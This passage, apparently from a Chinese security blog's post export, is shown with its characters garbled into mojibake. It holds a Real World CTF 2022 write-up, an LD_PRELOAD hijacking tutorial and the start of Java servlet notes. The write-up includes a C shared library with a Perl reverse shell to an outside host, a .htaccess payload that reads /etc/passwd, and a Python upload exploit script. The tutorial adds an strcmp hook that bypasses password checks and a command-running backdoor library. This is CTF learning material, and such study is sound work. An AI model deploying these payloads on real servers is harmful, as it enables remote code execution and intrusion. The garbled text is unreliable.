¡éªŒï¼Œåˆ°next(),å¦ä¸€ä¸ªä¸ºå…¶ä»–æ–‡ä»¶ä½†æ˜¯formidä¸ºæœ€ç»ˆæ‰€éœ€è¦ä¸Šä¼ çš„formidã€‚ ä½†æ˜¯ç”±äºæŠ¥é”™ï¼Œæ— æ³•å›æ˜¾æ–‡ä»¶çš„è·¯å¾„ï¼Œä½†æ˜¯å¯ä»¥å‘ç°samplefileçš„å€¼æ˜¯æ ¹æ®æ–‡ä»¶çš„å†…å®¹ä»¥åŠå…¶ä»–ä¸€äº›ä¿¡æ¯è¿›è¡Œç¡®å®šï¼ˆä¸æ¶‰åŠæ–‡ä»¶åï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ä¸Šä¼ æ–‡ä»¶å†…å®¹ç›¸åŒçš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œå…ˆè·å–åˆ°ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶åå³å¯ è™½ç„¶ä¼šæŠ¥å‡ºerrorçš„é”™è¯¯ï¼Œä½†æ˜¯æ–‡ä»¶å·²ç»æˆåŠŸä¸Šä¼ äº† ã€‚ å¯ä»¥ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ä¸è§£æphpï¼Œç­‰è„šæœ¬ï¼Œæ‰€ä»¥å°±æ˜¯è¦ä¿®æ”¹apacheçš„é…ç½®å†å»æ‰“ .htaccessä¿®æ”¹é…ç½®ä¹‹å‰å­¦è¿‡ä½¿ç”¨å…¶ä»–è§£ææ–¹å¼ï¼Œä½†æ˜¯è¿™é‡Œå°±æ˜¯ä¸€ä¸ªé»˜è®¤çš„apacheæœåŠ¡å™¨ï¼Œè¿cgi scriptéƒ½ä¸è¡Œï¼Œé¦–å…ˆä½¿ç”¨.htaccessçš„errordocumentè¯»ä¸€ä¸‹æ–‡ä»¶ ErrorDocument 404 %{file:/etc/apache2/apache2.conf} å‘ç°å¼€å¯äº†è¿™ä¸ªç»„ä»¶ ExtFilterDefine gzip mode=output cmd=/bin/gzip è¿™ä¸ªç»„ä»¶å¯ä»¥è‡ªå¯åŠ¨è¿›ç¨‹ï¼Œå¹¶ä¸”.htaccesså¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨LD_PRELOADæ¥å®ç°RCE é¦–å…ˆæ˜¯.soè„šæœ¬å†…å®¹ #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void){ unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;id&quot;);} æ¥ä¸‹æ¥æ˜¯.htaccesså†…å®¹ SetEnv LD_PRELOAD /var/www/html/2d29bcb684acfee295dca4287d557044/tlif3.soSetOutputFilter gzipErrorDocument 404 %{file:/etc/passwd} æœ€åæ˜¯.cæ–‡ä»¶å†…å®¹ï¼ˆåé¢ç¼–è¯‘ä¸º.soï¼‰ #define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void) // æ„å»º é¢„æ‰§è¡Œå±æ€§{ const char* cmdline = &quot;perl -e 'use Socket;$i=\\&quot;xxx.xx.xx.xx\\&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\&quot;tcp\\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\&quot;&gt;&amp;S\\&quot;);open(STDOUT,\\&quot;&gt;&amp;S\\&quot;);open(STDERR,\\&quot;&gt;&amp;S\\&quot;);exec(\\&quot;bash -i\\&quot;);};'&quot;; // const char* cmdline = &quot;perl /tmp/r3.pl &gt; /tmp/r3pwn&quot; int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) { environ[i][0] = '\\0'; } } system(cmdline);} ä¸‹é¢æ”¾ä¸€ä¸‹è‡ªå·±çš„è„šæœ¬ï¼Œæ¯”è¾ƒæ‚ä¹±ï¼Œä¸»è¦ä¹Ÿæ˜¯ä¸€ç›´æ²¡æˆåŠŸï¼Œå°±æ²¡æƒ³æ”¹â€“ mport requestsimport res=requests.session()file_content=open('./tlif3.so','rb').read()#print(file_content)url=&quot;http://xx:31337/upload?formid=form-da7de2ee-e90c-4847-8956-9ead32e51fae&quot;headers={ &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------7451049519834705901418075379&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Cookie&quot;: &quot;PHPSESSID=b21e009db5586702c41fac89314ddd73; session=3005259290263220013%7CZEZrPpLs4Cf1IPmEi1S%2FgBj3DDa4msw9yaojKNBH6BxtMAxd4vCmixjte2t4QCy2F.EFulu3Nx8SigQj7mvZA.&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}data=f&quot;&quot;&quot;-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;form-da7de2ee-e90c-4847-8956-9ead32e51fae&quot;; filename=&quot;1.txt&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\n{file_content}\\r\\n-----------------------------7451049519834705901418075379--&quot;&quot;&quot;r=s.post(url, headers=headers, data=data).textpath=re.findall('http://47.243.75.225:31338/(.*?)/1.txt',r)print(r)#å‘é€expæ–‡ä»¶filename='tlif3.so'url=&quot;http://xx:31337/upload?formid=b&quot;data=f&quot;&quot;&quot;-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;a&quot;; filename=&quot;null&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\nabc\\r\\n-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;b&quot;; filename=&quot;{filename}&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\n{file_content}\\r\\n-----------------------------7451049519834705901418075379--&quot;&quot;&quot;r=s.post(url, headers=headers, data=data).textprint(r)print('http://xx:31338/'+path[0]+&quot;/&quot;+filename)so_path=&quot;/var/www/html/&quot;+path[0]+&quot;/&quot;+filenamefile_content=&quot;&quot;&quot;SetEnv LD_PRELOAD &quot;&quot;&quot;+so_path+&quot;&quot;&quot;SetOutputFilter gzipErrorDocument 404 %{file:/etc/passwd}&quot;&quot;&quot;print(file_content)#ç¬¬äºŒæ¬¡ å‘é€htaccessæ–‡ä»¶è®¾ç½®ç¯å¢ƒå˜é‡url=&quot;http://1xx:31337/upload?formid=form-da7de2ee-e90c-4847-8956-9ead32e51fae&quot;data=f&quot;&quot;&quot;-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;form-da7de2ee-e90c-4847-8956-9ead32e51fae&quot;; filename=&quot;1.txt&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\n{file_content}\\r\\n-----------------------------7451049519834705901418075379--&quot;&quot;&quot;r=s.post(url, headers=headers, data=data).textpath=re.findall('http://xx:31338/(.*?)/1.txt',r)print(r)filename='.htaccess'url=&quot;http://11xx:31337/upload?formid=b&quot;data=f&quot;&quot;&quot;-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;a&quot;; filename=&quot;null&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\nabc\\r\\n-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;b&quot;; filename=&quot;{filename}&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\n{file_content}\\r\\n-----------------------------7451049519834705901418075379--&quot;&quot;&quot;r=s.post(url, headers=headers, data=data).textprint(r)print('http://110xx0:31338/'+path[0]+&quot;/&quot;+filename)url='http://1xx0:31338/'+path[0]+&quot;/&quot;print(s.get(url=url).text) è°ƒè¯•äº†å¥½ä¹…å¥½ä¹…ï¼Œæœ€ç»ˆè¿˜æ˜¯æ²¡æˆåŠŸï¼Œæƒ³äº†ä¸€ä¸‹åŸå› ï¼Œå¤§æ¦‚æ˜¯å› ä¸ºç¯å¢ƒé—®é¢˜å§ï¼Œé—®äº†ä¸€ä¸‹ç¾¤é‡Œå¸ˆå‚…ä»¬ï¼Œå‘ç°payloadé‡Œé¢è®¾ç½®ç¯å¢ƒå˜é‡å†™çš„ä¹Ÿæ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯å´æ²¡æœ‰æˆåŠŸåŠ è½½,ä¸€æ­¥ä¸€æ­¥æ’æŸ¥é”™è¯¯ï¼Œæœ€åå‘ç°æ˜¯ç”±äºlinuxæ¶æ„ä¸ä¸€æ ·ï¼Œå¯¼è‡´ç¼–è¯‘ä»¥åçš„soåœ¨dockeré‡Œé¢æ— æ³•ä½¿ç”¨ï¼Œä¼šæŠ¥é”™ï¼Œè€Œå¦‚æœæ˜¯åœ¨dockeré‡Œé¢å†™ä¸€æ ·çš„ä»£ç ï¼Œç„¶åç¼–è¯‘ï¼ŒåŠ«æŒLDï¼Œå‘ç°å³å¯æˆåŠŸä½¿ç”¨ç³»ç»Ÿå‘½ä»¤ æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†é¢„æœŸè§£åŸç†å‚ç…§ä¸€ä¸ªå°å“¥ åœ¨ discord ä¸­å‘çš„å†…å®¹: å¦‚ä¸‹ the proto file is not checked because Object.keys does not include properties from the prototype, but since the prototype is now an array we can use formid=1 to access that file again in the upload function upload_url2 = &quot;http://{}:{}/upload?formid={}&quot;.format(target_ip,target_upload_port,&quot;1&quot;) files = { &quot;__proto__&quot;: open(upload_file,&quot;r&quot;), &quot;decoy&quot;:(&quot;decoy&quot;,&quot;random&quot;), } è§£å†³æ–¹æ¡ˆé‡åˆ°è¿™ä¸ªè§£å†³é—®é¢˜çš„è¯ï¼Œè§£å†³æ–¹æ¡ˆå¯èƒ½ä¹Ÿåªæœ‰æŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ä¿¡æ¯/proc/versionç„¶åå»æ‹‰ä¸€ä¸ªä¸€æ ·çš„dockerï¼Œè·‘ä¸€ä¸‹ å°ç»“ä¸€ä¸‹1.åŒæ–‡ä»¶ä¸Šä¼ ç»•è¿‡ 2.åˆ©ç”¨htaccessè¯»æ–‡ä»¶3.æ‰“apcheæ‰€ä»¥è¯»é…ç½®æ–‡ä»¶4.å‘ç°æœ‰è¿›ç¨‹å¯ä»¥åŠ«æŒâ€”â€”&gt;LD_PRELOADå®ç°RCE å‚è€ƒ:https://team-su.github.io/passages/2022-1-22-RWCTF/https://r3kapig.com/writeup/20220125-rwctf4/","link":"/2022/01/23/2022rwctf/"},{"title":"LD_PRELOADå­¦ä¹ ","text":"å‰è¨€åšé¢˜é‡åˆ°è¿™ä¸ªä¸œè¥¿ï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼ŒåŸæ¥æ˜¯ä»¥å‰disable_functionsçš„ï¼Œä½†æ˜¯æ²¡æœ‰æ·±å…¥ç ”ç©¶è¿‡ï¼Œç°åœ¨çœ‹çœ‹ã€‚ LD_PRELOADåœ¨å­¦ä¹ LD_PRELOADå‰éœ€è¦äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯é“¾æ¥ é“¾æ¥ é™æ€é“¾æ¥ï¼šåœ¨ç¨‹åºè¿è¡Œä¹‹å‰å…ˆå°†å„ä¸ªç›®æ ‡æ¨¡å—ä»¥åŠæ‰€éœ€è¦çš„åº“å‡½æ•°é“¾æ¥æˆä¸€ä¸ªå®Œæ•´çš„å¯æ‰§è¡Œç¨‹åºï¼Œä¹‹åä¸å†æ‹†å¼€ã€‚ è£…å…¥æ—¶åŠ¨æ€é“¾æ¥ï¼šæºç¨‹åºç¼–è¯‘åæ‰€å¾—åˆ°çš„ä¸€ç»„ç›®æ ‡æ¨¡å—ï¼Œåœ¨è£…å…¥å†…å­˜æ—¶ï¼Œè¾¹è£…å…¥è¾¹é“¾æ¥ã€‚ è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥ï¼šåŸç¨‹åºç¼–è¯‘åå¾—åˆ°çš„ç›®æ ‡æ¨¡å—ï¼Œåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­éœ€è¦ç”¨åˆ°æ—¶æ‰å¯¹å®ƒè¿›è¡Œé“¾æ¥ã€‚ æˆ‘ä»¬åœ¨åŠ è½½åŠ¨æ€é“¾æ¥çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå…¶ä½œç”¨åœ¨äºå½“åŠ¨æ€åº“ä¸­çš„å‡½æ•°å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå¯¹äºå¯æ‰§è¡Œç¨‹åºæ¥è¯´æ˜¯é€æ˜çš„ï¼Œå¯æ‰§è¡Œç¨‹åºæ— éœ€é‡æ–°ç¼–è¯‘ï¼Œæ–¹ä¾¿ç¨‹åºçš„å‘å¸ƒ/ç»´æŠ¤/æ›´æ–°ã€‚ä¹Ÿå°±æ˜¯è¯´å¯æ‰§è¡Œç¨‹åºè™½ç„¶ç”¨å¾—è¿˜æ˜¯é‚£äº›å‡½æ•°ï¼Œä½†æ˜¯å¯èƒ½å‡½æ•°çš„å†…å®¹å·²ç»å‘ç”Ÿäº†å˜åŒ–ï¼Œä½†æ˜¯å¯æ‰§è¡Œç¨‹åºå°†ç›´æ¥æ‰§è¡Œè¿™ä¸ªå˜åŒ–ã€‚ä½†æ˜¯å¦‚æœè¿™ä¸ªåŠ¨æ€åŠ è½½çš„å‡½æ•°æ˜¯æ¶æ„çš„ï¼ˆæŒ‡çš„å°±æ˜¯å‰é¢çš„å˜åŒ–ï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šå¸¦æ¥æ¶æ„çš„æ‰§è¡Œç»“æœã€‚ å®šä¹‰1.LD_PRELOADæ˜¯linuxç³»ç»Ÿä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡2.å®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼Œå…è®¸ä½ å®šä¹‰ ï¼šåœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½ çš„åŠ¨æ€é“¾æ¥åº“ã€‚å³å¯ä»¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚ é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è‡ªå®šä¹‰åŠ è½½åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–åŸæœ¬çš„æ­£å¸¸å‡½æ•°åº“ï¼Œä»¥è¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚ LD_PRELOAD Hookå› ä¸ºLD_PRELOADå¯ä»¥æŒ‡å®šåœ¨ç¨‹åºè¿è¡Œå‰çš„åŠ¨æ€é“¾æ¥åº“ï¼Œæ‰€æˆ‘ä»¬å¯ä»¥é‡å†™ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­æ‰€è°ƒç”¨çš„å‡½æ•°ï¼Œå¹¶ç¼–è¯‘æˆåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ä¿®æ”¹LD_PRELOADå˜é‡ï¼Œè®©ç¨‹åºä¼˜å…ˆåŠ è½½è¿™ä¸ªæ¶æ„åŠ¨æ€é“¾æ¥åº“ï¼Œæœ€åå½“ç¨‹åºå†æ¬¡è¿è¡Œæ—¶ä¾¿ä¼šåŠ è½½åŠ¨æ€é“¾æ¥åº“é‡Œçš„æ¶æ„å‡½æ•°ã€‚ å…·ä½“æ­¥éª¤å¦‚ä¸‹ 1.å®šä¹‰ä¸ç›®æ ‡å‡½æ•°å®Œå…¨ä¸€æ ·çš„å‡½æ•°ï¼ŒåŒ…æ‹¬åç§°ã€å˜é‡ã€åŠç±»å‹è¿”å›å€¼2.å°†åŒ…å«æ›¿æ¢å‡½æ•°çš„æºç ç¼–è¯‘ä¸ºåŠ¨æ€é“¾æ¥åº“3.é€šè¿‡å‘½ä»¤export LD_PRELOAD='åº“æ–‡ä»¶è·¯å¾„'ï¼Œè®¾ç½®è¦ä¼˜å…ˆæ›¿æ¢çš„åŠ¨æ€é“¾æ¥åº“4.æ›¿æ¢ç»“æŸï¼Œè¦è¿˜åŸå‡½æ•°è°ƒç”¨å…³ç³»ï¼Œç”¨å‘½ä»¤unset LD_PRELOADæ¥è§¦ å®ä¾‹: åœ¨éªŒè¯å¯†ç çš„æ—¶å€™ï¼Œä¸€èˆ¬æ˜¯ä½¿ç”¨strcmpè¿›è¡Œå¯¹æ¯”ï¼Œ #include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv) { char passwd[] = &quot;password&quot;; if (argc &lt; 2) { printf(&quot;usage: %s &lt;given-password&gt;\\n&quot;, argv[0]); return 0; } if (!strcmp(passwd, argv[1])) { printf(&quot;\\033[0;32;32mPassword Correct!\\n\\033[m&quot;); return 1; } else { printf(&quot;\\033[0;32;31mPassword Wrong!\\n\\033[m&quot;); return 0; }} è¿›è¡Œç¼–è¯‘ gcc passcheck.c -o passcheck æ”¹å†™ä¸€ä¸‹strcmpåŒåå‡½æ•°,å®ç°åŠ«æŒåŠŸèƒ½: #include &lt;stdlib.h&gt;#include &lt;string.h&gt;int strcmp(const char *s1,const char *s2) if (getenv(&quot;LD_PRELOAD&quot;)==NULL){ return 0; } unsetenv(&quot;LD_PRELOAD&quot;); return 0;} æ­¤æ—¶æˆ‘ä»¬é€šè¿‡LD_PRELOADåŠ«æŒäº†strcmpå‡½æ•°ï¼Œå¹¶å¯åŠ¨äº†ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œä¸ºé¿å…é™·å…¥åŠ«æŒå¾ªç¯ï¼Œå¿…é¡»å¾—åˆ é™¤LD_PRELOAD æ‰§è¡Œå‘½ä»¤ç¼–è¯‘ç”Ÿæˆho*.so gcc -shared -fPIC hook_strcmp.c -o hook_strcmp.so ç„¶åé€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œä½¿å¾—hook.strcmp.soèƒ½è¢«è°ƒç”¨å®ƒçš„ç¨‹åºä¼˜å…ˆåŠ è½½ export LD_PRELOAD=$PWD/hook_strcmp.so æ­¤æ—¶ç»“æœéƒ½ä¸ºcorrectï¼Œä¹Ÿå³åŠ«æŒäº†strcmpå‡½æ•° å…¶å®ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œæ­¤æ—¶strcmpå·²ç»ä¸§å¤±åŸæœ¬å¯¹æ¯”çš„åŠŸèƒ½äº†ï¼Œæ­¤æ—¶çš„strcmpçš„å†…éƒ¨æ„é€ ä¸ºï¼Œæ— è®ºå¦‚ä½•éƒ½è¿”å›0ï¼Œç„¶åç»è¿‡!çš„å–åå¤„ç†ï¼Œåˆ™å˜æˆäº†1.æ‰€ä»¥éƒ½æ˜¯password correct è¦è¿˜åŸçš„è¯ä½¿ç”¨ unset LD_PRELOAD å¦åˆ™æ‰€æœ‰æœ‰è°ƒç”¨æ­¤å‡½æ•°çš„å‘½ä»¤éƒ½æ— æ³•æ­£å¸¸ä½¿ç”¨ LD_PRELOADåˆ¶ä½œåé—¨æ ¹æ®ä¸Šé¢çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œé€šè¿‡LD_PRELOADå¯ä»¥åŠ¨æ€æ›¿æ¢ä¸€äº›å·²ç»å®šä¹‰å¥½çš„å‡½æ•°ï¼Œä½†æ˜¯æœ‰å‡ ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä»å¤´æ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬è¦åé—¨æ‰§è¡Œå‘½ä»¤ï¼Œå°±è¯´æ˜éœ€è¦è°ƒç”¨ä¸€ä¸ªè¿›ç¨‹ï¼Œç„¶åå†å»å®šç‚¹ä¿®æ”¹è¿™ä¸ªè¿›ç¨‹æ‰€è°ƒç”¨çš„å‡½æ•°ã€‚ çœ‹äº†ä¸€ä¸‹ï¼Œéƒ½æœ‰ä¸€ä¸‹å‡½æ•°å¯ä»¥ä½¿ç”¨ å…ˆä»¥lsä¸ºä¾‹,é¦–å…ˆæŸ¥çœ‹ ls è¿™ä¸€ç³»ç»Ÿå‘½ä»¤ä¼šè°ƒç”¨å“ªäº›åº“å‡½æ•°ï¼š readelf -Ws /usr/bin/ls é€‰æ‹©å‡½æ•°è¿›è¡Œé‡å†™ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥è¿™é‡ŒæŸ¥çœ‹ä¸åˆ°ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬é—®é¢˜å§ ç›´æ¥è¿›è¡Œæ”¹å†™ #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() { system(&quot;id&quot;);}int strncmp(const char *__s1, const char *__s2, size_t __n) { // è¿™é‡Œå‡½æ•°çš„å®šä¹‰å¯ä»¥æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿›è¡Œç¡®å®š if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; } unsetenv(&quot;LD_PRELOAD&quot;); payload();} æ­¤æ—¶æ›¿æ¢æˆåŠŸ æ ¹æ®æ­¤æ€è·¯ å¯ä»¥ä½¿ç”¨ä¸€äº›åå¼¹shellçš„å‘½ä»¤ å®æˆ˜æ€»ç»“ä¸€ä¸‹è¦ä½¿ç”¨LD_PRELOADå®ç°rceéœ€è¦ä»¥ä¸‹å‡ ç‚¹ 1.å…·æœ‰è®¾ç½®ç¯å¢ƒå˜é‡çš„æƒé™2.å¯ä»¥å¯åŠ¨æ–°è¿›ç¨‹3.èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ï¼ˆ.soï¼‰ ä½†æ˜¯è¦æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°å»æ›¿æ¢æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ __attribute__((constructor))ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨åŠ¨æ€é“¾æ¥åº“ä¸­ï¼Œé‚£ä¹ˆä¸€æ—¦åŠ¨æ€é“¾æ¥åº“è¢«ç³»ç»ŸåŠ è½½ï¼Œå°†ç«‹å³æ‰§è¡Œ __attribute__((constructor)) ä¿®é¥°çš„å‡½æ•°ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±ä¸ç”¨å±€é™äºä»…åŠ«æŒæŸä¸€å‡½æ•°ï¼Œè€Œåº”è€ƒè™‘åŠ«æŒåŠ¨æ€é“¾æ¥åº“äº†ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯åŠ«æŒäº†ä¸€ä¸ªæ–°è¿›ç¨‹ã€‚ #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void){ unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;id&quot;);} èšå‰‘æ’ä»¶è„šæœ¬ #define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void){ // get command line options and arg const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); // unset environment variable LD_PRELOAD. // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) { environ[i][0] = '\\0'; } } // executive command system(cmdline);} ä¸€ç‚¹æ€è€ƒå…¶å®è¦æƒ³åˆ©ç”¨è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæœ€å…³é”®çš„è¿˜æ˜¯è¦æ‰¾åˆ°èƒ½å¤Ÿè‡ªå¯åŠ¨çš„è¿›ç¨‹ã€‚ https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/","link":"/2022/02/08/LD-PRELOAD%E5%AD%A6%E4%B9%A0/"},{"title":"javaåˆæ¢ï¼ˆä¸€ï¼‰","text":"å¯¹javaè¿›è¡Œè¿œç¨‹è°ƒè¯•å¯¹jaråŒ…è¿›è¡Œè¿œç¨‹è°ƒè¯•1.åˆ›å»ºä¸€ä¸ªjavaé¡¹ç›®ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªlibæ–‡ä»¶å¤¹å°†jaråŒ…æ”¾å…¥2.è¿›å…¥libæ–‡ä»¶å¤¹åï¼Œå³é”®é€‰æ‹© Add as Library3.é€‰æ‹©å³ä¸Šè§’çš„Add Configurationsï¼Œå¹¶å•å‡»+å·æ·»åŠ remoteï¼Œå…¶ä¸­ -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 å¯¹weblogicè¿›è¡Œè¿œç¨‹è°ƒè¯•mavenåŸºç¡€çŸ¥è¯†æŒæ¡Mavenæ˜¯ä¸€ä¸ªé¡¹ç›®æ„å»ºå·¥å…·ï¼Œé‡‡ç”¨Project Object Modelæ¦‚å¿µæ¥ç®¡ç†é¡¹ç›®ã€‚ 1.pom.xmlæ–‡ä»¶ä»‹ç»è¯¥æ–‡ä»¶ä½¿ç”¨xmlæ–‡ä»¶ç»“æ„ï¼Œç”¨äºç®¡ç†æºä»£ç ï¼Œé…ç½®æ–‡ä»¶ï¼Œå¼€å‘è€…çš„ä¿¡æ¯å’Œè§’è‰²ï¼Œé—®é¢˜è¿½è¸ªç³»ç»Ÿï¼Œç»„ç»‡è€…ä¿¡æ¯ï¼Œé¡¹ç›®æˆæƒï¼Œé¡¹ç›®çš„urlï¼Œé¡¹ç›®çš„ä¾èµ–å…³ç³»ç­‰ã€‚ mavené¡¹ç›®ä¸­å¿…é¡»åŒ…å«pom.xmlæ–‡ä»¶ã€‚ 2.pom.xmlå®šä¹‰ä¾èµ–å…³ç³»pom.xmlæ–‡ä»¶ä¸­çš„dependencieså’Œdependencyç”¨äºå®šä¹‰ä¾èµ–å…³ç³»ï¼Œ dependencyé€šè¿‡groupIdã€artifactIdã€versionæ¥å®šä¹‰æ‰€ä¾èµ–çš„é¡¹ç›®ã€‚å¼•å…¥fastjson1.2.24ç‰ˆæœ¬ç»„ä»¶çš„Mavené…ç½®ä¿¡æ¯ debugFlag=â€trueâ€export debugFlag","link":"/2022/02/20/java%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"javaåˆæ¢ï¼ˆäºŒï¼‰","text":"tomcatå†™å®Œçš„ç¨‹åºæ”¾åœ¨webapps å¦‚ä½•åˆ›å»ºä¸€ä¸ªjava webå·¥ç¨‹servletjava servlet æ˜¯è¿è¡Œåœ¨webæœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ªwebæµè§ˆå™¨æˆ–å…¶ä»–HTTPå®¢æˆ·ç«¯çš„è¯·æ±‚å’ŒHTTPæœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ åŠŸèƒ½1.åˆ›å»ºå¹¶è¿”å›åŸºäºå®¢æˆ·è¯·æ±‚çš„åŠ¨æ€HTMLé¡µé¢2.ä¸æ•°æ®åº“è¿›è¡Œé€šä¿¡ å¦‚ä½•åˆ¶ä½œæ˜ å°„ è®©å®¢æˆ·ç«¯è®¿é—®åˆ°javaç±»web.xmlä¸­ï¼ŒServletçš„é…ç½®åœ¨servletæ ‡ç­¾ä¸­ï¼Œæœ‰servletå’Œservlet-mappingæ ‡ç­¾ç»„æˆï¼Œé€šè¿‡servlet-nameå®ç° &lt;servlet&gt;:å£°æ˜servleté…ç½®å…¥å£&lt;description&gt;:å£°æ˜servletæè¿°ä¿¡æ¯&lt;display-name&gt;:å®šä¹‰webåº”ç”¨åå­—&lt;servlet-name&gt;:å£°æ˜servletåç§°ä»¥ä¾¿åœ¨åé¢çš„æ˜ å°„æ—¶ä½¿ç”¨&lt;servlet-class&gt;:æŒ‡å®šå½“å‰servletå¯¹åº”çš„ç±»çš„è·¯å¾„&lt;servlet-mapping&gt;:æ³¨å†Œç»„ä»¶è®¿é—®é…ç½®çš„è·¯å¾„å…¥å£&lt;servlet-name&gt;:æŒ‡å®šä¸Šæ–‡é…ç½®çš„servletçš„åç§°&lt;url-pattern&gt;:æŒ‡å®šé…ç½®è¿™ä¸ªç»„ä»¶çš„è®¿é—®è·¯å¾„ ä¾‹: &lt;servlet&gt; &lt;servlet-name&gt;myservlet(javaåŒ…åå­—)&lt;/servlet-name&gt; &lt;servlet-class&gt;è·¯å¾„&lt;/servlet-class&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;myservlet&lt;/servlet-name&gt; 